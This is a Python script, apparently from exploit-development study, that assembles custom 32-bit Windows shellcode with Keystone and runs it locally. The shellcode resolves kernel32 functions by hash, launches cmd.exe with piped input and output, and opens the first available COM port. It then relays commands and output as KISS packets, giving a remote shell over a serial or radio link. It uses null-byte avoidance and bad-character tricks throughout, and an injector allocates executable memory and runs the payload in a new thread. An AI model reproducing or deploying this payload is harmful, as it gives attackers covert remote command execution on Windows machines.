import ctypes, struct
from keystone import *

CODE = (
    " start: " #
    
    # ------------------------------------------------------
    # Adjust stack pointers
    # ------------------------------------------------------
    #"int3;"
    "    add esp, 0xfffffef0 ;"
    "    mov ebp, esp ;"
    "    add esp, 0xfffffef0 ;"             # Avoiding NULL bytes ( sub esp, 0x110) - make room to store args/vars

    # ------------------------------------------------------
    # Build functions to help us find pointers to Kernel32 API methods
    # ------------------------------------------------------
    " find_kernel32: " #
    "    xor ecx, ecx ;"            # ECX = 0
    "    mov esi,fs:[ecx+30h] ;"    # ESI = &(PEB) ([FS:0x30])
    "    mov esi,[esi+0Ch] ;"       # ESI = PEB->Ldr
    "    mov esi,[esi+1Ch] ;"       # ESI = PEB->Ldr.InInitOrder

    " next_module: " #
    "    mov ebx, [esi+8h] ;"       # EBX = InInitOrder[X].base_address
    "    mov edi, [esi+20h] ;"      # EDI = InInitOrder[X].module_name
    "    mov esi, [esi] ;"          # ESI = InInitOrder[X].flink (next)
    "    cmp [edi+12*2], cx ;"      # (unicode) modulename[12] == 0x00?
    "    jne next_module ;"         # No: try next module.

    " find_function_shorten: "              #
    "    jmp find_function_shorten_bnc ;"   # Short jump
    " find_function_ret: "                  #
    "    pop esi ;"                         # POP the return address from the stack
    "    mov [ebp+0x04], esi ;"             # Save find_function address for later usage
    "    jmp resolve_symbols_kernel32 ;"    #
    " find_function_shorten_bnc: "          #
    "    call find_function_ret ;"          # Relative CALL with negative offset to avoid NULL bytes

    " find_function: "              #
    "    pushad ;"                      # Save all registers
                                        # Base address of kernel32 is in EBX from
                                        # Previous step (find_kernel32)
    "    mov eax, [ebx+0x3c] ;"         # Offset to PE Signature
    "    mov edi, [ebx+eax+0x78] ;"     # Export Table Directory RVA
    "    add edi, ebx ;"                # Export Table Directory VMA
    "    mov ecx, [edi+0x18] ;"         # NumberOfNames
    "    mov eax, [edi+0x20] ;"         # AddressOfNames RVA
    "    add eax, ebx ;"                # AddressOfNames VMA
    "    mov [ebp-4], eax ;"            # Save AddressOfNames VMA for later
    " find_function_loop: " #
    "    jecxz find_function_finished ;" # Jump to the end if ECX is 0
    "    dec ecx ;"                      # Decrement our names counter
    "    mov eax, [ebp-4] ;"             # Restore AddressOfNames VMA
    "    mov esi, [eax+ecx*4] ;"         # Get the RVA of the symbol name
    "    add esi, ebx ;"                 # Set ESI to the VMA of the current symbol name
    " compute_hash: " #
    "    mov eax, 0xffffffff ;"         # NULL EAX
    "    inc eax ;"
    "    cdq ;"                         # NULL EDX
    "    cld ;"                         # Clear direction
    " compute_hash_again: " #
    "    lodsb ;"                    # Load the next byte from esi (dll name) into al
    "    push ebx ;"                 # Save base addr of current module
    "    mov bl, al ;"               # Avoid bad char
    "    test al, bl ;"              # Check for NULL terminator
    "    pop ebx ;"                  # restore now
    "    jz compute_hash_finished ;" # If the ZF is set, we've hit the NULL term and end of string, else continue
    "    ror edx, 0x0d ;"            # Rotate edx 13 bits to the right
    "    add edx, eax ;"             # Add the new byte to the accumulator
    "    jmp compute_hash_again ;"   # Next iteration
    " compute_hash_finished: " # Intentionally blank, just a label for the end of the function
    " find_function_compare: " #
    "    cmp edx, [esp+0x24] ;"     # Compare the computed hash with the requested hash
                                    # 0x24 offset must point to pre-computed hash and may change
                                    # depending on how many push/pop instructions are in shellcode
    "    jnz find_function_loop ;"  # If it doesn't match go back to find_function_loop
    "    mov edx, [edi+0x24] ;"     # AddressOfNameOrdinals RVA
    "    add edx, ebx ;"            # AddressOfNameOrdinals VMA
    "    mov cx, [edx+2*ecx] ;"     # Extrapolate the function's ordinal
    "    mov edx, [edi+0x1c] ;"     # AddressOfFunctions RVA
    "    add edx, ebx ;"            # AddressOfFunctions VMA
    "    mov eax, [edx+4*ecx] ;"    # Get the function RVA
    "    add eax, ebx ;"            # Get the function VMA
    "    mov [esp+0x1c], eax ;"     # Overwrite stack version of eax from pushad
    " find_function_finished: " #
    "    popad ;"                   # Restore registers
    "    ret ;" #


    # ------------------------------------------------------
    # Resolve symbols for Kernel32 API methods
    # ------------------------------------------------------
    " resolve_symbols_kernel32: "
 
    "    mov eax, 0x7d0118a6 ;"
    "    sub eax, 0x01010101 ;"
    "    push eax ;"                    # CreateFileA hash (0x7c0017a5)
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x10], eax ;"         # Save address for later usage

    "    push 0xf0eaf6d5 ;"             # GetCommState hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x14], eax ;"         # Save address for later usage

    "    push 0xf102f6d5 ;"             # SetCommState hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x18], eax ;"         # Save address for later usage

    "    push 0x170c8f80 ;"             # CreatePipe hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x1c], eax ;"         # Save address for later usage

    "    push 0x0ffd97fb ;"             # CloseHandle hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x20], eax ;"         # Save address for later usage

    "    mov eax, 0xdc2e4ab1 ;"
    "    sub eax, 0x01010101 ;"
    "    push eax ;"                    # Sleep hash (0xdb2d49b0) - 0xdb is bad char
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x24], eax ;"         # Save address for later usage

    "    push 0x10fa6516 ;"             # ReadFile hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x28], eax ;"         # Save address for later usage

    "    push 0xe80a791f ;"             # WriteFile hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x2c], eax ;"         # Save address for later usage

    "    push 0x16b3fe72 ;"             # CreateProcessA hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x30], eax ;"         # Save address for later usage

    "    push 0x91afca54 ;"             # VirtualAlloc hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x34], eax ;"         # Save address for later usage

    # -----------------------------------------
    # Create named pipes for cmd.exe process
    # -----------------------------------------

    " create_security_attributes: "  
    "    xor ecx, ecx ;"        # NULL ecx
    "    inc ecx ;"             # Set ECX=1 (True)
    "    push ecx ;"            # bInheritHandle
    "    dec ecx ;"
    "    push ecx ;"            # lpSecurityDescriptor
    "    push 0x0c ;"           # nLength (length of SECURITY_ATTRIBUTES struct)
    "    mov [ebp+0x40], esp ;" # pointer to SECURITY_ATTRIBUTES struct
    #"int3;"
    " call_create_pipe_1: "     # Create InPipe
    "    xor ecx, ecx ;"
    "    push ecx ;"            # arg: nSize
    "    push [ebp+0x40] ;"     # arg: LPSECURITY_ATTRIBUTES
    "    mov ebx, ebp ;"
    "    add ebx, 0x54 ;"
    "    push ebx ;"            # arg: stdInPipeWrite
    "    mov ecx, ebp ;"
    "    add ecx, 0x50 ;"
    "    push ecx ;"            # arg: stdInPipeRead
    "    call [ebp+0x1c] ;"     # Call CreatePipe

    " call_create_pipe_2: "     # Create OutPipe
    "    xor ecx, ecx ;"
    "    push ecx ;"            # arg: nSize
    "    push [ebp+0x40] ;"     # arg: LPSECURITY_ATTRIBUTES
    "    mov ebx, ebp ;"
    "    add ebx, 0x5c ;"
    "    push ebx ;"            # arg: stdOutPipeWrite
    "    mov ecx, ebp ;"
    "    add ecx, 0x58 ;"
    "    push ecx ;"            # arg: stdOutPipeRead
    "    call [ebp+0x1c] ;"     # Call CreatePipe

    # -----------------------------------------
    # Create structure areguments for CreateProcess
    # -----------------------------------------

    " create_startupinfoa: " #
    "    push [ebp+0x5c] ;"        # Push hStdError (hStdOutPipeWrite)
    "    push [ebp+0x5c] ;"        # Push hStdOutput (hStdOutPipeWrite)
    "    push [ebp+0x50] ;"        # Push hStdInput (hStdInPipeRead)
    "    xor ecx, ecx ;"
    "    push ecx ;"        # Push lpReserved2
    "    push ecx ;"        # Push cbReserved2 & wShowWindow
    "    mov al, 0x80 ;"    # Move 0x80 to AL
    "    xor ecx, ecx ;"    # Null ECX
    "    mov cx, 0x0181 ;"
    "    sub cx, 0x0101 ;"  # Get to 0x80 without null bytes
    "    add eax, ecx ;"    # Set EAX to 0x100
    "    push eax ;"        # Push dwFlags
    "    xor ecx, ecx ;"    # Null ECX
    "    push ecx ;"        # Push dwFillAttribute
    "    push ecx ;"        # Push dwYCountChars
    "    push ecx ;"        # Push dwXCountChars
    "    push ecx ;"        # Push dwYSize
    "    push ecx ;"        # Push dwXSize
    "    push ecx ;"        # Push dwY
    "    push ecx ;"        # Push dwX
    "    push ecx ;"        # Push lpTitle
    "    push ecx ;"        # Push lpDesktop
    "    push ecx ;"        # Push lpReserved
    "    mov cl, 0x44 ;"    # Move 0x44 to AL
    "    push ecx ;"        # Push cb
    "    push esp ;"        # Push pointer to the STARTUPINFOAstructure
    "    pop edi ;"         # Store pointer to STARTUPINFOA in EDI
    " create_cmd_string: " #
    "    mov eax, 0xff9a879b ;"     # Move 0xff9a879b into EAX
    "    neg eax ;"                 # Negate EAX, EAX = 00657865
    "    push eax ;"                # Push part of the "cmd.exe" string
    "    push 0x2e646d63 ;"         # Push the remainder of the "cmd.exe" string
    "    push 0x5c32336d ;"
    "    push 0x65747379 ;"
    "    push 0x535c7377 ;"
    "    push 0x6f646e69 ;"
    "    push 0x575c3a43 ;"
    "    push esp ;"                # Push pointer to the "cmd.exe" string
    "    pop ebx ;"                 # Store pointer to the "cmd.exe" string in EBX
    " call_createprocessa: " #
    #"    mov eax, esp ;"                # Move ESP to EAX
    #"    xor ecx, ecx ;"                # Null ECX
    #"    mov cx, 0x390 ;"               # Move 0x390 to CX
    #"    sub eax, ecx ;"                # Subtract CX from EAX to avoid overwriting the structure later
    #"    push eax ;"                    # Push lpProcessInformation
    "    add esp, 0xfffffff0 ;"
    "    mov eax, esp ;"                # arg: lpProcessInformation
    "    add esp, 0xfffffff0 ;"
    "    push eax ;"                    # arg: lpProcessInformation

    "    push edi ;"                    # Push lpStartupInfo
    "    mov eax, 0xffffffff ;"         # NULL EAX
    "    inc eax ;"
    "    push eax ;"                    # Push lpCurrentDirectory
    "    push eax ;"                    # Push lpEnvironment
    "    push eax ;"                    # Push dwCreationFlags
    "    inc eax ;"                     # Increase EAX, EAX = 0x01 (TRUE)
    "    push eax ;"                    # Push bInheritHandles
    "    dec eax ;"                     # Null EAX
    "    push eax ;"                    # Push lpThreadAttributes
    "    push eax ;"                    # Push lpProcessAttributes
    "    push eax ;"                    # Push lpCommandLine
    "    push ebx ;"                    # Push lpApplicationName
    "    call dword ptr [ebp+0x30] ;"   # Call CreateProcessA

    # -----------------------------------------
    # Close unnedeed handles
    # -----------------------------------------
    "    push [ebp+0x5c] ;"             # stdOutPipeWrite
    "    call [ebp+0x20] ;"             # Call CloseHandle

    "    push [ebp+0x50] ;"             # stdInPipeRead
    "    call [ebp+0x20] ;"             # Call CloseHandle

    # ------------------------------------------------------
    # Allocate memory for SerialBuffer
    # ------------------------------------------------------
    " call_VirtualAlloc: "
    "    xor ecx, ecx ;"
    "    add ecx, 0x40 ;"
    "    push ecx ;"                    # arg: flProtect (PAGE_EXECUTE_READWRITE) 0x40
    "    add cx, 0x2fc1 ;"
    "    dec ecx ;"
    "    push ecx ;"                    # arg: flAllocationType (MEM_RESERVE) 0x3000
    "    sub cx, 0x3002 ;"
    "    push ecx ;"                    # arg: dwSize (0x2000 bytes)
    "    xor edx, edx ;"
    "    push edx ;"                    # arg: lpAddress (NULL)
    "    call dword ptr [ebp+0x34] ;"    # Call VirtualAlloc
    "    mov [ebp+0x0c], eax ;"         # save remote address for later

    # ------------------------------------------------------
    # Try to open COM1, COM2, etc until one works
    # ------------------------------------------------------
    " build_com_string: "               # Build COM0 string
    "    xor ecx, ecx ;"
    "    push ecx ;"                    # NULL string terminator
    "    push 0x304d4f43 ;"             # COM0
    "    mov [ebp+0x08], esp ;"         # Save pointer to COM string

    " find_com_port_loop: "             # try to open COM1, COM2, COM3, etc until one works
    "    mov eax, [ebp+0x08] ;"         # Retreive pointer to COM string
    "    mov ebx, [eax] ;"              # Put COM string in EAX
    "    add ebx, 0x02010101 ;"
    "    sub ebx, 0x01010101 ;"         # effectively adds 0x01000000 avoiding NULL bytes (Increment COM string)
    "    mov [eax], ebx ;"              # Store updated COM string for later

    " call_CreateFileA: "
    "    xor edx, edx ;"
    "    push edx ;"                    # arg: hTemplateFile
    "    push edx ;"                    # arg: dwFlagsAndAttributes
    "    add edx, 0x03 ;"
    "    push edx ;"                    # arg: dwCreationDisposition (OPEN_EXISTING)
    "    sub edx, 0x03; "
    "    push edx ;"                    # arg: lpSecurityAttributes
    "    push edx ;"                    # arg: dwShareMode
    "    mov edx, 0xbfffffff ;"
    "    inc edx ;"
    "    push edx ;"                    # arg: dwDesiredAccess (GENERIC_READ | GENERIC_WRITE) (0xC0000000)
    "    push [ebp+0x08] ;"             # arg: lpFileName
    "    call [ebp+0x10] ;"             # Call CreateFileA

    " check_result:"
    "    cmp eax, 0xffffffff ;"         # Check for INVALID_HANDLE_VALUE (failed to open COM port)
    "    je find_com_port_loop ;"       # Try again if it wasn't opened
    "    mov [ebp+0x08], eax; "         # Save handle for later

    # ------------------------------------------------------
    # Get COM port configuration including baud rage
    # ------------------------------------------------------
    " call_GetCommState: "
    "    lea ebx, [ebp+0x70] ;"             
    "    push ebx ;"                    # arg: lpDCB
    "    push eax ;"                    # arg: hFile
    "    call [ebp+0x14] ;"             # call GetCommState to fill DCB struct with current settings

    # ------------------------------------------------------
    # Set baud rate to 9600
    # ------------------------------------------------------
    " update_DCB: "
    "    xor ecx, ecx ;"
    "    add cx, 0x2580 ;"              # 0n9600
    "    add ebx, 0x04 ;"               # Offset to baud rate param
    "    mov [ebx], ecx ;"              # set baud to 9600

    " call_SetCommState: "
    "    sub ebx, 0x04 ;"
    "    push ebx ;"                    # arg: lpDCB
    "    push [ebp+0x08] ;"             # arg: hFile
    "    call [ebp+0x18] ;"             # call SetCommState to update baud rate

    # -----------------------------------------
    # Main shell loop
    # -----------------------------------------
    " main_loop: "

    # -----------------------------------------
    # Read from CMD pipe output
    # -----------------------------------------
    # Wait 1 second for command to complete
    "    xor ecx, ecx ;"
    "    add cx, 0x3e8 ;"
    "    push ecx ; "                   # arg: dwMilliseconds
    "    call [ebp+0x24] ;"             # call Sleep()

    # Read command output from pipe
    " read_pipe: "                      # Read stage3 payload
    "    xor ecx, ecx ;"
    "    push ecx ;"                    # arg: lpOverlapped structure
    "    lea ecx, [ebp+0x60] ;"
    "    push ecx ;"                    # arg: lpNumberOfBytesRead (Writable DWORD).
    "    xor ecx, ecx ;"
    "    add cx, 0x3fd ;"
    "    push ecx ;"                    # arg: nNumberOfBytesToRead (0x03fd) (0n1021)
    "    mov ecx, [ebp+0x0c] ;"         # address from virtualalloc
    "    add ecx, 0x02 ;"               # make room to later insert KISS control chars
    "    push ecx ;"                    # arg: lpBuffer
    "    push [ebp+0x58] ;"             # arg: hFile (hStdOutPipeRead)
    #"int3;"
    "    call [ebp+0x28] ;"             # Call ReadFile()

    # -----------------------------------------
    # Add KISS control chars
    # -----------------------------------------
    "    mov eax, [ebp+0x0c] ;"         # beginning of SerialBuffer
    "    xor ecx, ecx ;"
    "    mov [eax+0x01], cl ;"          # Second char of KISS packet is 0x00
    "    add cx, 0x01c1 ;"
    "    sub cx, 0x0101;"               # ECX = 0xC0 (KISS_END and a bad char)
    "    mov [eax], cl ;"
    "    mov ebx, [ebp+0x60] ;"         # numberOfBytesRead
    "    add ebx, 0x02 ;"               # Control chars
    "    add eax, ebx ;"                # EAX points to the end of the SerialBuffer
    "    mov [eax], cl ;"               # KISS packet ends with KISS_END (0xc0)
    
    # -----------------------------------------
    # Write KISS packet to COM port
    # -----------------------------------------
    " write_file: "
    "    xor ecx, ecx ;"
    "    push ecx ;"                    # arg: lpOverlapped
    "    mov ebx, ebp ;"  
    "    add ebx, 0x64 ;"       
    "    push ebx ;"                    # arg: numberOfBytesWritten
    "    mov ebx, [ebp+0x60] ;"         # numberOfBytesRead
    "    add ebx, 0x03 ;"               # include added KISS control chars
    "    push ebx ;"                    # arg: numberOfBytesToWrite
    "    push [ebp+0x0c] ;"             # arg: lpBuffer (SerialBuffer)
    "    push [ebp+0x08] ;"             # arg: hFile (COM port)
    "    call [ebp+0x2c] ;"             # Call WriteFile

    # ------------------------------------------------------
    # Read from COM port until two 0xC0 chars are received (start and end bytes)
    # ------------------------------------------------------
    "    xor esi, esi ;"                # 0xc0 byte counter
    "    xor ecx, ecx ;"                
    "    mov ebx, ecx ;"                # Byte Counter

    " read_file: "                      # Read stage3 payload
    "    xor ecx, ecx ;"
    "    push ecx ;"                    # arg: lpOverlapped structure
    "    lea ecx, [ebp+0x60] ;"
    "    push ecx ;"                    # arg: lpNumberOfBytesRead (Writable DWORD).
    "    push 0x01 ;"                   # arg: nNumerOfBytesToRead
    "    mov eax, [ebp+0x0c] ;"         # SerialBuffer
    "    add eax, ebx ;"
    "    push eax ;"                    # arg: lpBuffer
    "    push [ebp+0x08] ;"             # arg: hFile
    "    call [ebp+0x28] ;"             # Call ReadFile()
    "    cmp dword ptr [ebp+0x60], 0x01 ;"        # Check if we read one byte
    "    jne read_file ;"               # if not, then just go back and read another byte
    "    mov cl, 0xc1 ;"
    "    dec ecx ;"
    "    mov eax, [ebp+0x0c] ;"
    "    add eax, ebx ;"                # last read char in lpBuffer       
    "    inc ebx ;"                     # incremember the byte counter
    "    cmp cl, byte ptr [eax] ;"      # Check if the last read byte is 0xc0 (KISS start/stop bytes)
    "    je increment_c_count; "
    "    jmp read_file ;"               # Read another char

    " increment_c_count: "
    "    inc esi ;"
    "    cmp esi, 0x02 ;"
    "    jne read_file ;"               # If it's the first 0xc0 then keep reading since this is the beginning of the KISS packet
    
    # -----------------------------------------
    # Add carriage return chars to incomming command
    # -----------------------------------------
    "    mov ecx, [ebp+0x0c] ;"         # SerialBuffer
    "    add ecx, ebx ; "               # Last char of SerialBuffer (should be 0x00)
    "    dec ecx ;"                     # Strip KISS control char at end
    "    mov byte ptr [ecx], 0x0d ;"    # add carriage return
    "    mov byte ptr [ecx+0x01], 0x0a ;"   # add newline
    "    xor edx, edx;"
    "    mov byte ptr [ecx+0x02], dl ;"     # add NULL byte

    # -----------------------------------------
    # Write COM port command to CMD pipe
    # -----------------------------------------
    " write_pipe: "                     
    "    xor ecx, ecx ;"
    "    push ecx ;"                    # arg: lpOverlapped
    "    mov ecx, ebp ;"  
    "    add ecx, 0x64 ;"       
    "    push ecx ;"                    # arg: numberOfBytesWritten
    #"    add ebx, 0x01 ;"               # include added KISS control chars to previous byte count
    "    dec ebx ;"
    "    push ebx ;"                    # arg: numberOfBytesToWrite
    "    mov ecx, [ebp+0x0c] ;"         # SerialBuffer
    "    add ecx, 0x02 ;"               # Strip KISS control chars
    "    push ecx ;"                    # arg: lpBuffer (SerialBuffer)
    "    push [ebp+0x54] ;"             # arg: hFile (hStdInPipeWrite)
    "    call [ebp+0x2c] ;"             # Call WriteFile
    "    jmp main_loop;"                # Loop forever

)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)

encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
instructions = ""
for dec in encoding:
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")

print(instructions)


sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                            ctypes.c_int(len(shellcode) + 0x1000),
                                            ctypes.c_int(0x3000),
                                            ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                    buf,
                                    ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                        ctypes.c_int(0),
                                        ctypes.c_int(ptr),
                                        ctypes.c_int(0),
                                        ctypes.c_int(0),
                                        ctypes.pointer(ctypes.c_int(0)))
                                        
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))